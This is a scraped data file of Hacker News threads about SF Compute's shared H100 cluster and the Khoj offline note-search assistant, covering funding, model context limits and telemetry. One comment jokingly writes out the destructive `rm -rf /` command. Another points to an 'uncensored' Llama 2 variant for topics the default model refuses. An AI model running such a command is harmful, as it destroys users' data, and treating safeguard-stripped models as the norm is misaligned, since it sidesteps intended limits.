hours ago | root | parent | next [–] I've generally tried to give Twitter the benefit of the doubt but I would never trust them as an infrastructure provider in their current incarnation. Reliability and consistency have been so far from their focus.replymike_d 15 hours ago | root | parent | prev | next [–] Generally when you just stop paying your bills the datacenter holds your hardware and eventually auctions it off to cover some of your debt. I seriously doubt Twitter has any access to the two of three datacenters Elon decided to not pay for.replyaionaiodfgnio 17 hours ago | root | parent | prev | next [–] Would you really trust a company that doesn't pay its rent to run your infrastructure?replymoneycantbuy 18 hours ago | prev | next [–] How did you get the money to buy 512 H100s?replytaminka 18 hours ago | parent | next [–] ask no questions hear no liesreplyrvnx 18 hours ago | root | parent | next [–] EDIT: They seem to be in a raising fund / debt stage. Great initiativereplywilliamstein 18 hours ago | root | parent | next [–] Their announcement says \"We can probably get a good deal from a bank [...]\", so maybe they don't just have 20M USD sitting around.replyrvnx 18 hours ago | root | parent | next [–] Well, this pushes me even further in the direction that they are actually good guys that need support, and that they are trying to bring a good deal on the table :)replyherval 17 hours ago | root | parent | prev | next [–] unrelated to this specific initiative, but - I keep seeing a lot of announcements of huge VC rounds around what's effectively datacenters for GPUs. Curious about the math behind that - I feel like those things get obsolete so fast, it's almost like the whole scooter rental thing, where the unit economics doesn't add up.Anyone have an insight?replyhumanistbot 18 hours ago | parent | prev | next [–] From sentence one of the post, it clearly states that they are VC funders who are doing this for a round of startups they just funded, and they're looking for others to be a part of it.replyflaque 18 hours ago | root | parent | next [–] Oh no, definitely not. We just got a loan.Neither Alex or I are currently VCs, and this has no affiliation with any venture fund.We want to be a customer of the sf compute group too!replyopportune 14 hours ago | root | parent | next [–] How’d you get this loan? Is it from a benevolent individual who just wants to make something happen?If not and you got the loan from a bank, super curious how you were able to get the bank to trust that renting out the GPUs would cover the loan or if some other reasoning convinced them. Assuming you aren’t trying to turn this into a big business, that knowledge might help a lot of other players run similar programs and further democratize SOA GPU access.replyxwdv 13 hours ago | root | parent | next [–] I’m fairly certain this loan is either a private individual or a HELOC or something. No way is a bank just going to loan out a bunch of money to some startup like this.replyxwdv 16 hours ago | root | parent | prev | next [–] I’m curious, how are those loans guaranteed?replyturbobooster 15 hours ago | root | parent | next [–] The only guarantee is them not paying it backreplyitissid 15 hours ago | prev | next [–] Noob Thought: So this would be a blue print on how a mid tier universities with older large compute cluster ops could do things in 2023 to support large LLM research?Perhaps its also a way for freshly applying grad students to look at a university looking to do research in LLMs that requires scale...replyitissid 15 hours ago | parent | next [–] Like to clarify, a new grad students could look at the current group and ask \"Hey I know you are working on LLMs, but how many $$ of your grant are dedicated to how many TPU hours per grad student?\"replylatchkey 19 hours ago | prev | next [–] 554 5.7.1 : Relay access denied554 5.7.1 : Relay access deniedreplyflaque 19 hours ago | parent | next [–] !!!!!! fixing this. For the moment, evan at roomservice dot devreplyranting-moth 18 hours ago | root | parent | next [–] Ah, putting out flames live on HN. Back in the day it was on IRC or just on the phone with the customer. I miss those times.replyfragmede 19 hours ago | root | parent | prev | next [–] fwiw, https://roomservice.dev/ is currently a 404replyflaque 18 hours ago | root | parent | next [–] Ah yeah, that's normal! Was from my old CRDT company, and works as a good emergency email while we debug our DNS.replyfragmede 18 hours ago | root | parent | next [–] I assume it was a Take3 reference. I wanted to point it out, in case it was supposed to return more than a 404.replylatchkey 18 hours ago | root | parent | prev | next [–] http != smtproomservice.dev. 60 IN MX 5 alt1.aspmx.l.google.com. roomservice.dev. 60 IN MX 5 alt2.aspmx.l.google.com. roomservice.dev. 60 IN MX 1 aspmx.l.google.com. roomservice.dev. 60 IN MX 10 alt3.aspmx.l.google.com. roomservice.dev. 60 IN MX 10 alt4.aspmx.l.google.com. roomservice.dev. 60 IN MX 15 4ig53n4pw7p3cuxm7n7xi7dpuyq6722aipexvhkngzbd2e4mudmq.mx-verification.google.com.replyfragmede 17 hours ago | root | parent | next [–] I know the difference between an email and a web page, tyvm.replylatchkey 18 hours ago | root | parent | prev | next [–] donereplysashank_1509 17 hours ago | prev | next [–] Correct me if I’m wrong but doesn’t Lambda Labs already provide them at 1.89$? What’s the point if you’re starting out not the cheapestreplyagajews 16 hours ago | parent | next [–] Ah that’s only if you pay for 3 years of compute upfront. Most startups, especially the small ones, really can’t afford thatreplydavidmurphy 17 hours ago | parent | prev | next [–] Looks like their site is quoting a rate of $1.99 now https://lambdalabs.com/replyversion_five 17 hours ago | root | parent | next [–] See this post above: https://news.ycombinator.com/item?id=36935032Price and market depth are very different thingsreplymackid 13 hours ago | prev | next [–] Nat Friedman and Daniel Gross setup a 2,512 H100 cluster [1] for their startups, with a very similar “shared” model. Might be interesting to connect with them.[1] https://andromedacluster.com/replyflaque 10 hours ago | parent | next [–] Nat & Daniel’s cluster is great, and we fully recommend startups seek out this option as well. Nat & Daniel are some of the best investors one can havereplymetadat 11 hours ago | prev | next [–] Will it be a Slurm cluster, or what kind of scheduler is SFC planning to use?replyucarion 17 hours ago | prev | next [–] Wishing y'all the best of luck. This would be huge for a lot of folks.replynetcraft 10 hours ago | prev | next [–] Honest question I don’t know how to consider: are we further along or behind with AI given crypto’s use of GPUs? Has the same cards bought for mining furthered AI, or maybe that demand lead to more research into GPUs and what they can do - or would we be further along if we weren’t wasting these cards on mining?replyfragmede 10 hours ago | parent | next [–] Ethereum's (thrice delayed) move to PoS put a glut of GPUs on the market, just in time for the AI boom to swallow them back up, so I think it ended up okay. NVDA certainly had a great few days in the market thanks to AI though.replycoffeebeqn 3 hours ago | root | parent | next [–] Eth was mined mainly on consumer GPUs which as far as i understand, have too little VRAM for most AI trainingreplyrushingcreek 11 hours ago | prev | next [–] I love this. Us at Phind.com would love to be a part of this.replyAndrewKemendo 14 hours ago | prev | next [–] The billion dollar question is:Who is funding this?Cause if it’s VC then it’s going to have the same fate as everything else after 5-7 years.I hope y’all have as innovative of a business model. You’ll need it if you want to do what you’re doing now for more than a few yearsreplyfragmede 14 hours ago | parent | next [–] What's wrong with doing something profitable for a few years? H100's in a couple of years will be like having a cluster of K80's today.Not everything has grow to have the appetite of Galactus and swallow a whole planet. Making single digit millions of dollars over a couple of years is still worthwhile, especially if it helps others and moves humanity forwards.This project isn't ever going to want to try and compete with AWS, so no, it's not a billion dollar question. $20 Million, yeah.replyconstantly 14 hours ago | root | parent | next [–] You’re completely right in everything you say about growing sustainably and making some money over time. But if this project is VC that all goes out the window and it won’t be profitable unless it massively galactus scales to compete with AWS in 5-7 years, and will fail after that almost certainly, like the vast, vast majority of VC projects.replyAndrewKemendo 14 hours ago | root | parent | prev | next [–] Hey I agree!That’s why I’m asking because a “bootstrapped” company like you describe has a future…One backed by VC doesn’tI mean they may have a future but not like you describereplyresonance1994 17 hours ago | prev | next [–] Just curious, do you guys use renewable energy to power your cluster?replyjeepers6 7 hours ago | prev | next [–] Please take this question without prejudice.Is it accurate to say you’re willing to go into ~20,000,000 USD debt to sell discounted computer-as-a-service to researchers/startups, but unwilling to go into debt to sponsor the undergraduate degrees of ~100-500 students at top-tier schools? (40k - 200k USD per degree)Or, you know, build and fund a small public school/library or two for ~5 years?replyrsync 19 hours ago | prev | next [–] \"Once the cluster is online ...\"Where will the cluster be hosted ?May I suggest that you get your IP transit from he.net ?replyfragmede 18 hours ago | parent | next [–] Not to mention, San Francisco is not known for having cheap real estate, nor is it known for having cheap electricity. My last (residential) bill to PGE, I paid $0.50938/KWh at peak.replyvladgur 17 hours ago | root | parent | next [–] While business rates may be different, California cannot be a sensible place to host power-hungry infrastructure - our electrical rates are easily 5-8 times of other locations within the USreply29athrowaway 18 hours ago | prev | next [–] During a gold rush, sell shovels.When was the last time you spoke to a chatbot?replynetsec_burn 17 hours ago | parent | next [–] For me, today and almost every day since the beginning of this year. Not sure if that saying applies here.replyversion_five 17 hours ago | parent | prev | next [–] Chatbot in the sense I think you mean is a horrible application. Millions of people are using large language models daily though.replylulunananaluna 17 hours ago | parent | prev | next [–] Downvoted by others, yet very true. This is a valid business model, nothing to be ashamed about it.reply20 hours ago | prev [–] [dead]",
    "originSummary": [
      "Alex and Evan are building a 512 H100 compute cluster for training large generative models.",
      "The cluster is designed for bursty training runs and is priced competitively.",
      "Their aim is to provide a cost-effective option for AI startups to conduct big training runs.",
      "They want to be the go-to choice for startups in need of such services."
    ],
    "commentSummary": [
      "The conversation covers various topics related to achieving success, including the significance of optimism and realism.",
      "Frustrations with the TPU Research Cloud program are discussed, with a call for improvements.",
      "Users share both positive and negative experiences with the program.",
      "Cloud providers and the need for projects like Lambda and Fluidstack are discussed.",
      "The challenges of accessing GPU resources for AI training are highlighted.",
      "An affordable shared GPU infrastructure called SFC Compute is introduced.",
      "Various topics related to AI, funding, sustainability, and chatbots are also touched upon."
    ],
    "points": 666,
    "commentCount": 158,
    "retryCount": 0,
    "time": 1690737924
  },
  {
    "id": 36933452,
    "title": "Show HN: Khoj – Chat offline with your second brain using Llama 2",
    "originLink": "https://github.com/khoj-ai/khoj",
    "originBody": "Hi folks, we&#x27;re Debanjum and Saba. We created Khoj as a hobby project 2+ years ago because: (1) Search on the desktop sucked; we just had keyword search on the desktop vs google for the internet; and (2) Natural language search models had become good and easy to run on consumer hardware by this point.<p>Once we made Khoj search incremental, I completely stopped using the default incremental search (C-s) in Emacs. Since then Khoj has grown to support more content types, deeper integrations and chat (using ChatGPT). With Llama 2 released last week, chat models are finally good and easy enough to use on consumer hardware for the chat with docs scenario.<p>Khoj is a desktop application to search and chat with your personal notes, documents and images. It is accessible from within Emacs, Obsidian or your Web browser. It works with org-mode, markdown, pdf, jpeg files and notion, github repositories. It is open-source and can work without internet access (e.g on a plane).<p>Our chat feature allows you to extract answers and create content from your existing knowledge base. Example: <i>&quot;What was that book Trillian mentioned at Zaphod&#x27;s birthday last week&quot;</i>. We personally use the chat feature regularly to find links, names and addresses (especially on mobile) and collate content across multiple, messy notes. It works online or offline: you can chat without internet using Llama 2 or with internet using GPT3.5+ depending on your requirements.<p>Our search feature lets you quickly find relevant notes, documents or images using natural language. It does not use the internet. Example: Search for <i>&quot;bought flowers at grocery store&quot;</i> will find notes about <i>&quot;roses at wholefoods&quot;</i>.<p>Quickstart:<p><pre><code>  pip install khoj-assistant &amp;&amp; khoj\n</code></pre>\nSee <a href=\"https:&#x2F;&#x2F;docs.khoj.dev&#x2F;#&#x2F;setup\">https:&#x2F;&#x2F;docs.khoj.dev&#x2F;#&#x2F;setup</a> for detailed instructions<p>We also have desktop apps (in beta) at <a href=\"https:&#x2F;&#x2F;github.com&#x2F;khoj-ai&#x2F;khoj&#x2F;releases&#x2F;tag&#x2F;0.10.0\">https:&#x2F;&#x2F;github.com&#x2F;khoj-ai&#x2F;khoj&#x2F;releases&#x2F;tag&#x2F;0.10.0</a> if you want to try them out.<p>Please do try out Khoj and let us know if it works for your use cases? <i>Looking forward to the feedback!</i>",
    "commentLink": "https://news.ycombinator.com/item?id=36933452",
    "commentBody": "Show HN: Khoj – Chat offline with your second brain using Llama 2 (github.com/khoj-ai)497 points by 110 21  109 commentsHi folks, we're Debanjum and Saba. We created Khoj as a hobby project 2+ years ago because: (1) Search on the desktop sucked; we just had keyword search on the desktop vs google for the internet; and (2) Natural language search models had become good and easy to run on consumer hardware by this point.Once we made Khoj search incremental, I completely stopped using the default incremental search (C-s) in Emacs. Since then Khoj has grown to support more content types, deeper integrations and chat (using ChatGPT). With Llama 2 released last week, chat models are finally good and easy enough to use on consumer hardware for the chat with docs scenario.Khoj is a desktop application to search and chat with your personal notes, documents and images. It is accessible from within Emacs, Obsidian or your Web browser. It works with org-mode, markdown, pdf, jpeg files and notion, github repositories. It is open-source and can work without internet access (e.g on a plane).Our chat feature allows you to extract answers and create content from your existing knowledge base. Example: \"What was that book Trillian mentioned at Zaphod's birthday last week\". We personally use the chat feature regularly to find links, names and addresses (especially on mobile) and collate content across multiple, messy notes. It works online or offline: you can chat without internet using Llama 2 or with internet using GPT3.5+ depending on your requirements.Our search feature lets you quickly find relevant notes, documents or images using natural language. It does not use the internet. Example: Search for \"bought flowers at grocery store\" will find notes about \"roses at wholefoods\".Quickstart:pip install khoj-assistant && khojSee https://docs.khoj.dev/#/setup for detailed instructionsWe also have desktop apps (in beta) at https://github.com/khoj-ai/khoj/releases/tag/0.10.0 if you want to try them out.Please do try out Khoj and let us know if it works for your use cases? Looking forward to the feedback!agg23 18 hours ago | next [–] Just a heads up, your landing page on your website doesn't seem to mention Llama/the offline usecase at all, only online via OpenAI.----What model size/particular fine-tuning are you using, and how have you observed it to perform for the usecase? I've only started playing with Llama 2 at 7B and 13B sizes, and I feel they're awfully RAM heavy for consumer machines, though I'm really excited by this possibility.How is the search implemented? Is it just an embedding and vector DB, plus some additional metadata filtering (the date commands)?reply110 17 hours ago | parent | next [–] Thanks for the pointer, yeah the website content has gone stale. I'll try update it by end of dayKhoj is using the Llama 7B, 4bit quantized, GGML by TheBloke.It's actually the first offline chat model that gives coherent answers to user queries given notes as context.And it's interestingly more conversational than GPT3.5+, which is much more formalreplyjmorgan 16 hours ago | root | parent | next [–] This is a super cool project. Congrats! If you’re looking at trying different models with one API check out an open-source project a few folks and I have been working on in July in case it’s helpful https://github.com/jmorganca/ollamaLlama 2 gives great answers, even the 7B model. There’s an “uncensored” 7B version as well George Sung has fine-tuned for topics that the default Llama2 model won’t discuss - eg I had trouble having Llama2 review authentication/security code or topics: https://huggingface.co/TheBloke/llama2_7b_chat_uncensored-GG...From just playing around with it the uncensored model still seems to know where to “draw the line” on sensitive topics but YMMVIf you do end up checking out Ollama you can try it with with this command or there’s an API too (it’s not in the docs yet)ollama run llama2-uncensoredreplysabakhoj 14 hours ago | root | parent | next [–] This (ollama) is neat! Thanks for the pointers.Yeah, I ran into a couple of funny edge cases using Llama v2 with my personal notes. For example, if I ever asked it anything remotely personal (as I would with a personal assistant), it would often start telling me that asking for personal data is unethical. I get it, you have to be careful with the open source LLMs, but still a bit funny. It does work with enough coaxing though.replyagg23 17 hours ago | root | parent | prev | next [–] Oh interesting, so you're not using Llama 2, you're using the original. Have you begun to evaluate Llama 2 to determine the differences in performance?How are you determining what notes (or snippets of notes?) to be injected as context? Especially given the small 2048 context limit with Llama 1.replysabakhoj 16 hours ago | root | parent | next [–] Quick clarification, we are using LlamaV2 7B. We didn't experiment with Llama 1 because we weren't sure of the licensing limitations.We determine note relevance by using cosine similarity between the query and the knowledge base (your note embeddings). We limit the context window for Llama2 to 3 notes (while OpenAI might comfortably take up to 9). The notes are ranked based on most to least similar and truncated based on the context window limit. For the model we're using, we're still limited to 2048 tokens for Llama v2.replybugglebeetle 13 hours ago | root | parent | next [–] Have you looked at using the long context (32K) version of the Llama v2 7B released by Together AI?https://together.ai/blog/llama-2-7b-32kreply110 12 hours ago | root | parent | next [–] Oh neat, thanks for sharing that! Having a 32K offline model is pretty promising. Let me test out how it performsreplyOkGoDoIt 11 hours ago | root | parent | prev | next [–] I thought llama V2 has a context window of 4096?replyM4v3R 5 hours ago | root | parent | prev | next [–] Why only the 7B version? Would there be possibility to add support for the 13B as well if someone has enough RAM to run it?replymoneywoes 8 hours ago | root | parent | prev | next [–] Is a vector db used?replyrapnie 10 hours ago | parent | prev | next [–] > Just a heads up, your landing page on your website doesn't seem to mention Llama/the offline usecase at all, only online via OpenAI.I am sufficiently uneducated on the ins and outs of AI integrations to always wonder if projects like this one can be used in local-only mode, i.e. when self-hosted ensuring me that never any of my personal information is sent to a remote service. So it would be very helpful to very explicitly give me that assurance of privacy, if that's the case.replyblinkingled 19 minutes ago | prev | next [–] Somewhat unrelated but do people have links to share that walk you through taking Llama2 model and feeding it local data - confluence links, Google docs, plain text documents etc. I came across embeddings and langchain but was curious if people had thoughts on better ways to go about it as a newcomer experiment.replybtbuildem 49 minutes ago | prev | next [–] Heads up, docker build fails with:#12 2.017 ERROR: Could not find a version that satisfies the requirement pyside6>=6.5.1 (from khoj-assistant) (from versions: none)#12 2.017 ERROR: No matching distribution found for pyside6>=6.5.1------executor failed running [/bin/sh -c sed -i 's/dynamic = \\[\"version\"\\]/version = \"0.0.0\"/' pyproject.toml && pip install --no-cache-dir .]: exit code: 1replymavsman 13 hours ago | prev | next [–] Really cool to see this! Local is the real future of AI.I got really excited about this and fired it up on my petite little M2 Macbook Air only for it to grind it to a halt. Think the old days when you had a virus on your PC and you'd move the mouse then wait 45 seconds to see the cursor move. It honestly made me feel nostalgic. I guess I have to taper performance expectations with this Air, though this is the first time it's happened.replyquickthrower2 9 hours ago | parent | next [–] Just wait 10 years when computers have a dedicated AI-PU and you don't have to worry about freezing anything up to talk to your bot.replyjmorgan 10 hours ago | parent | prev | next [–] How much memory do you have in your Macbook? The 7B models seem to work well with at least 16GB of unified memory, but I’ve seen Macs with 8GB really struggle.replymavsman 48 minutes ago | root | parent | next [–] Indeed it's just a poor little 8GB of RAM.replyovernight5349 16 hours ago | prev | next [–] Could this do something like take in the contents of my web history for the day and summarize notes on what I've been researching?This is getting very close to my ideal of a personal AI. It's only gonna be a few more years until I can have a digital brain filled with everything I know. I can't waitreply110 12 hours ago | parent | next [–] That would be pretty awesome. Building a daily web history summarizer as a browser extension shouldn't be too much work. I bet there's something like that already out there.Having something that indexes all your digital travels and makes it easily digestible will be gold. Hopefully Khoj can become that :)replyreitanqild 11 hours ago | root | parent | next [–] > I bet there's something like that already out there.There was.It was called Google Desktop Search, it was awesome, and it was axed.That said, today I wouldn't use it anyway as both I and Google have changed a lot.reply110 8 hours ago | root | parent | next [–] Oh yeah, I used to use Google Desktop too. It was awesome for it's timereplyusehackernews 16 hours ago | parent | prev | next [–] Interesting, this is the exact question that came to mind for me. This would address a pain point for me.Does anyone have recommendations for a tool that does it?Or, anyone want to build it together?replyporcc 12 hours ago | parent | prev | next [–] https://www.rewind.aireplyaliasxneo 11 hours ago | root | parent | next [–] Have you used this? Looks fairly interesting.replyIAmNotACellist 10 hours ago | prev | next [–] What's the posthog telemetry used for? Why is there nothing on it in the docs? Why no clear way to opt out?replysabakhoj 8 hours ago | parent | next [–] Thanks for pointing that out!We use it for understanding usage -- like determining whether people are using markdown or org or more.Everything is collected entirely anonymized, and no identifiable information is ever sent to the telemetry server.To opt-out, you set the `should-log-telemetry` value in `khoj.yml` to false. Updated the docs to include these instructions and what we collect -- https://docs.khoj.dev/#/telemetry.replyKerbonut 10 hours ago | parent | prev | next [–] It’s pretty easy to remove which is what I ended up doing. The project works remarkably well otherwise.replycoder543 18 hours ago | prev | next [–] This seems like a cool project.It would be awesome if it could also index a directory of PDFs, and if it could do OCR on those PDFs to support indexing scanned documents. Probably outside of the scope of the project for now, but just the other day I was just thinking how nice it would be to have a tool like this.reply110 17 hours ago | parent | next [–] Yeah being able to search and chat with PDF files is quite useful.Khoj can index directory of PDFs for search and chat. But it does not currently work with scanned PDF files (i.e not with ones without selectable text).Being able to work with those would be awesome. We just need to get to it. Hopefully soonreplyadr1an 17 hours ago | root | parent | next [–] Check pdftotext it's a CLI tool (maybe a library too) that makes pdf text selectable. Oh sorry, I meant to say ocrmypdf. But hey, maybe it's worth checking both.replysamstave 18 hours ago | parent | prev | next [–] Ive wanted a crawler on my machine for auto-categorizing and organizing, tagging and moving ALL my files around based on all my machines - so the ability to crawl PDFs, downloads, screenshots, pictures, etc and give me a logical tree of the org of the files - and allow me to modify it by saying \"add all PDF related to [subject] here and the organize by source/author etc... and then move all my screenshots, ordered by date hereetc...I've wanted a \"COMPUTER.\", uh... I say \"COMPUTER!\", 'sir, you have to use the keyboard', ah a Keyboard, how quaint.... forever.reply110 16 hours ago | root | parent | next [–] That.would.be.awesome! Khoj isn't their yet, but that actually shouldn't be too far away if you give it a voice interface and terminal access.Of course, having it be stable enough to not `rm -rf /` soon after is definitely not part of the warrantyreplywanderingmind 10 hours ago | prev | next [–] Two comments1. If you want better adoption especially among corporations, GPL-3 wont cut it. Maybe think of some business friendly licenses (MIT etc)2. I understand the excitement about llm's. But how about making something more accessible to people with regular machines and not state of art. I use rip-grep-all (rga) along with fzf [1] that can search all files including pdfs in a specific folders. However, I would like a GUI tool to (a) search across multiple folders,(b) provide priority of results across folders, filetypes and(c) store search histories where I can do a meta-search. This is sufficient for 95% of my usecases to search locally and I don't need LLM. If khoj can enable such search as default without LLM that will be a gamechanger for many people without a heavy compute machine or who dont want to use OpenAI.[1] https://github.com/phiresky/ripgrep-all/wiki/fzf-Integrationreplypvh 10 hours ago | parent | next [–] Just a note to suggest that giving away your hard work to those who will profit from it in the hope that they will remember you later seems like a pretty dubious exchange.Have a look at how that worked out for the folks who built node and its libraries versus the ones who maintained control of their work (like npm).replyquickthrower2 9 hours ago | root | parent | next [–] What happened there. Surely the people who built node (or the people building the most popular fork at least) get to define what the default package manager is etc. and get some BATNA against the likes of a 3rd party package manager profiting from their thing. I don't know what the node/npm relationship story is though.replyZuiii 9 hours ago | parent | prev | next [–] If corporations have no issue with using restrictive proprietary licenses, they should not have any issues with the GPL.replytrenchgun 9 hours ago | parent | prev | next [–] That seems like a pretty trivial thing to implement. Why not do it yourself?replyspdustin 19 hours ago | prev | next [–] I see you’re using gpt4all; do you have a supported way to change the model being used for local inference?A number of apps that are designed for OpenAI’s completion/chat APIs can simply point to the endpoints served by llama-cpp-python [0], and function in (largely) the same way, while using the various models and quants supported by llama.cpp. That would allow folks to run larger models on the hardware of their choice (including Apple Silicon with Metal acceleration or NVIDIA GPUs) or using other proxies like openrouter.io. I enjoy openrouter.io myself because it supports Anthropic’s 100k models.[0]: https://github.com/abetlen/llama-cpp-pythonreplysyntaxing 18 hours ago | parent | next [–] The point of gpt4all is that you can change the model with minimal breaking. You should be able to change this line https://github.com/khoj-ai/khoj/blob/master/src/khoj/process... to the model you want. You'll need to build your own local image with docker-compose but should be relatively straight forward.replysabakhoj 13 hours ago | root | parent | next [–] Yeah, the gpt4all project is super neat. If folks are inclined enough, it should be fairly straightforward for you to clone the Khoj project and swap out the model used. You'd have to update the model type in a few places, but should be easy enough just with normal string/keyword search. Then run it directly from inside your machine. You will, however, have to go in and modify the prompt structure to fit the model's expectation. Some guidance on that in this PR with Falcon: https://github.com/khoj-ai/khoj/pull/330/files#diff-7fa11396...I'll provide my insight from experimentation integrating Llama V2/GPT4All into Khoj -- Falcon 7b is probably the runner up in models that can be supported on consumer hardware, and it really wasn't good enough (for me) on my machine to be useful. The token consumption with personal notes context is too large, and the content too variable for a small model like that to be able to understand it. It's fine if you're just doing normal question-answering back and forth, but you don't need Khoj for that.reply110 19 hours ago | parent | prev | next [–] No, we don't yet. Lots of developer folks want to try different models, we want to provide simple to use, but deep assistance. Kind of unsure what to focus on given our limited resources.replyvunderba 15 hours ago | root | parent | next [–] I really like the idea of running a dedicated server that serves up various large language models via a standardized API, and then Khoj could just be pointed at one. Depending on the notes and the type of conversation I want to have, that would even allow for Khoj to swap models on the fly.replymmanfrin 19 hours ago | prev | next [–] As someone who's been getting int o using Obsidian and messing around with chat ais, this is excellent, thank you!reply110 18 hours ago | parent | next [–] Thanks! Do try it out and let us know if it works for your use-case?replytarwin 17 hours ago | parent | prev | next [–] Really encourages me to move to Obsidion :Dreplywg0 17 hours ago | prev | next [–] I have not tried it but something like this should exist. I don't think it is going to be as useable on consumer hardware as yet unless you have a good enough GPU but within couple of years (or less), we'll be there I am sure.Irrelevant opinion - The logo is beautiful, I like it and so are the colours used.Lastly, LLMA2 for such use cases, I think is capable enough that paying for ChatGPT won't be as lucrative especially when privacy is of concern.Keep it up. Good craftsmanship. :)replysabakhoj 16 hours ago | parent | next [–] Thanks! I do think Llama V2 is going to be a good enough replacement for ChatGPT (aka GPT3.5) for a lot of use cases.replypachico 2 hours ago | prev | next [–] Would anybody be able to recommend any standalone solution (essentially data must not leave elsewhere) to chat with documents with a web interface?I tried privategpt but results were not great.replyRoark66 8 hours ago | prev | next [–] From previous answers it appears you're using standard lama-7b (quantized to 4 bits). I suppose you're doing a search on the notes than you pass what you found with the original query to lama. This technique is cool, but there are many limitations. For example lama's content length.I can't wait for software that will take my notes each day and fine tune a LLM model on them so I can use entire context length for my question/answers.replyankit219 8 hours ago | parent | next [–] > I can't wait for software that will take my notes each day and fine tune a LLM model on them so I can use entire context length for my question/answersProblem is finetuning does not work that way. Finetuning is useful when you want to teach a model about a certain pattern, not when you want it output it right. Eg: With enough finetuning and prompts, a model will be able to output the result in a certain format that you need, but it does not guarantee that it would not be hallucination prone. The best way to minimize hallucination is still embedding based retrieval passed along with the question/prompt.In future, there can be a system where you can build a knowledge base for LLMs, and tell it to access that for any knowledge, and finetune it for the patterns you want the output in.replyRomanHauksson 18 hours ago | prev | next [–] Awesome work, I've been looking for something like this. Any plans to support Logseq in the future?reply110 18 hours ago | parent | next [–] Yes, we hope to get to it soon! This has been an ask on our Github since a while[1][1]: https://github.com/khoj-ai/khoj/issues/141replyubertaco 14 hours ago | prev | next [–] Hey, I saw Khoj hit HN a few weeks ago and get slaughtered because the messaging didn't match the product.You've come a good way in both directions: the messaging is clearer about current state vs aspirations, and you've made good progress towards the aspirational parts.Really glad to see the warm reception you're getting now. Nice job, y'all.replysabakhoj 14 hours ago | parent | next [–] Hey ubertaco! I remember you. Appreciate the well-wishes. The landing page still needs some tweaking. It's kind of hard keeping what you're building in sync with what you're aspiring for, but we're definitely working towards it.replykljuka 5 hours ago | prev | next [–] I tried the search using Slavic language (all my notes are in Slovene) - it performed very poorly: if the searched keyword was not directly in the note itself, the search results seemed to be more or less random.replymlajtos 19 hours ago | prev | next [–] Have anyone got something valuable from talking to your second brain? What kind of conversations are you trying to have?replybozhark 19 hours ago | parent | next [–] Traumatic Brain Injury. I can’t remember yesterday.Would be hella nice to connect all the scattered lines of thoughts in various notes on a variety of platforms.replyandai 17 hours ago | root | parent | next [–] If you're on mac I would strongly recommend Notational Velocity (or the Alt version), if they still run (I know Apple likes to break compatibility).I've tried dozens of notetaking apps and that's the only one that truly felt like a second brain.It's because of the speed. Infuriatingly, Obsidian for example can search just as fast, but they intentionally programmed in a lag after each keystroke... (I know because I removed it.)replynmarinov 15 hours ago | root | parent | next [–] > they intentionally programmed in a lag after each keystrokeYeah, it's seems they've added a debounce. I'd prefer to set it to 0ms as well. Do you remember how you removed it?replyandai 16 minutes ago | root | parent | next [–] I followed this guide for modifying Electron apps.https://github.com/jonmest/How-To-Tamper-With-Any-Electron-A...Obsidian is not open source so it's minified and hard to read. But I was able to find the relevant code and just set the delay to 0.(I'm away from computer now, I'll see if I can find the code later.)What also helped is that all Electron apps are just Chromium so you can run the dev tools and the debugger! I think the hotkey is F12, and/or Ctrl+Shift+J.replysleight42 10 hours ago | root | parent | prev | next [–] I need this response too.replymandmandam 15 hours ago | root | parent | prev | next [–] Dear Lord, why would they do such a thing. I think I've experienced this, and decided I hated Obsidian because it made my computer feel slow (it's not).replyhoosieree 2 hours ago | root | parent | next [–] I don't know about Obsidian, but delay before search prevents a bunch of useless queries to the prefixes of your search terms. If search is slow, adding a delay to prevent extra searches might make searching feel faster.Alternatively, you could get near-zero delay and no spurious queries by requiring the user type Enter or click a button... but that design is much less common these days.replyandai 14 minutes ago | root | parent | next [–] Re: \"useless searches\": my point in the comment above was that this is what Notational Velocity does--instantly updates search list on every keystroke--and it's the reason I like it significantly more than anything else I've tried.replyandai 17 hours ago | root | parent | prev | next [–] If you're on windows check out TimeSnapper. The classic version is free and works fine.It screencaps your desktop every 5 sec so you can watch a timelapse of how you spent your day. (Assuming it was on the computer!)I did find it heavy on the disk usage so I wrote a ffmpeg script to convert it to video (much more efficient).reply110 18 hours ago | root | parent | prev | next [–] Wow that's an intense use-case. I don't know how but we'd love to be able to support this.If you can collate your notes into markdown or some such, then messy notes can be handled, at least using Khoj with GPT3.5+.Do let us know how we can help out and what your current biggest pain-points are?replymlajtos 18 hours ago | root | parent | prev | next [–] I am sorry.Would some summary of previous day would be helpful to you? Is your memory problem only episodic, or does it extend to factual and kinesthetic as well?replysamstave 18 hours ago | root | parent | next [–] I want a body cam that I wear and it transcribes into something searchable from things I did...Basically like a gopro on steroids with searchable context - or even the ability for me to say outloud \"KEEP A NOTE OF THIS\" and it will keep a segment tagged and can give me summaries of moments I wanted particularly logged...I applied to YC with an idea 'sorta' like this almost a decade ago.The idea was to have a timeline of communications between all my contacts such that I could side-scroll a timeline with dots of actions such a \"sent email\" \"made call\" \"sent text\" received txt\" and I could see all these in filters by contacts/day whatever...This was pre-snowden, so I didnt have confirmation that there were already people doing this for me, just not letting me browse my own data ;-)replyerklik 9 hours ago | root | parent | next [–] > Basically like a gopro on steroids with searchable context - or even the ability for me to say outloud \"KEEP A NOTE OF THIS\" and it will keep a segment tagged and can give me summaries of moments I wanted particularly logged...This is generally called Lifelogging. https://roberdam.com/en/wisper.html - roberdam@ created basically what you just said, but focused on Audio, not Video.https://news.ycombinator.com/item?id=29692087 has some possible info too.replyandai 17 hours ago | root | parent | prev | next [–] Yeah, it bugs me that I don't know where I was a year ago but my phone company does.Can I get that via GDPR? Has anyone tried?For Android users a more straightforward option is location history, but you should probably turn that off.replysabakhoj 8 hours ago | root | parent | next [–] Likewise! That was one of the impulses behind working on Khoj -- we have all this data about places we go to, things we do, websites we traffic, but such poor tooling into how to actually retrieve that information right now.For example, if I stayed at an Airbnb last year in Houston and needed to lookup the address for some reason, I'd be going either to gmail and running some keywords searches (\"Houston\", \"Airbnb\"), or going to my Airbnb app.Really, I want a single endpoint where all my personal data can be made available to me, ideally without sacrificing my privacy. Location's a cool use case.replyfragmede 13 hours ago | root | parent | prev | next [–] Why should you turn that off? If you're afraid of being tracked, it's too late, you're already being tracked by your carrier via the IMEI of your phone, without your consent. Location history is there for your convenience so you can relive where you were a year ago.replysabakhoj 16 hours ago | root | parent | prev | next [–] I quite like this concept. It would be neat if you could relay the data to a personal server for processing and insight extraction. Seems feasible with phone camera. I think gopros would be limited based on battery life (in my experience).replydjangelic 14 hours ago | root | parent | next [–] I wonder if this is a better 